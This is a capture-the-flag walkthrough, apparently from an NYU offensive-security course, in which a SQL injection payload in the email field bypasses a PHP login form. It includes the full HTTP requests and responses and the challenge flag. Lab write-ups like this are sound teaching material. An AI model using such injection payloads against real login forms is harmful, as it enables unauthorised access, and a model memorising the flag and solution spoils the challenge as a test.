50 points here: `[http://offsec-chalbroker.osiris.cyber.nyu.edu:1240](http://offsec-chalbroker.osiris.cyber.nyu.edu:1240)`

Flag: `flag{w0w_such_1337_SQLi}`

Walkthrough:
Loging in takes you to login portal:
![[Pasted image 20240409164754.png]]

Login portal only takes email address format in email field
That's okay, we can intercept and edit the requests (or send requests directly)

Got an error with a email payload of `test'`
Request:
```
POST /login.php? HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:1240
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://offsec-chalbroker.osiris.cyber.nyu.edu:1240
Connection: close
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:1240/login.php?
Cookie: CHALBROKER_USER_ID=lmv9443; PHPSESSID=76eu88qnnso29ql60ugh7f4bn6
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: pink

email=test'&password=test
```

Response:
```
HTTP/1.0 500 Internal Server Error
Date: Tue, 09 Apr 2024 21:52:15 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 0
Connection: close
Content-Type: text/html
```
# Pwning
Send Payload:
```
POST /login.php? HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:1240
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://offsec-chalbroker.osiris.cyber.nyu.edu:1240
Connection: close
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:1240/login.php?
Cookie: CHALBROKER_USER_ID=lmv9443; PHPSESSID=76eu88qnnso29ql60ugh7f4bn6
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: pink

email=test'+OR+1=1--+test&password=test
```
Redirect Response
```
HTTP/1.1 302 Found
Date: Tue, 09 Apr 2024 21:46:17 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: index.php
Content-Length: 0
Connection: close
Content-Type: text/html
```

After redirect:
```
HTTP/1.1 200 OK
Date: Tue, 09 Apr 2024 21:46:22 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1908
Connection: close
Content-Type: text/html
...omitted for brevity...
<div class="container">
	<div style="padding: 3rem 1.5rem; text-align: center">
		<h2>
		    Welcome test' OR 1=1-- test!
	    </h2>
	    <p>
		    flag{w0w_such_1337_SQLi}
	    </p>
	</div>
</div>
```

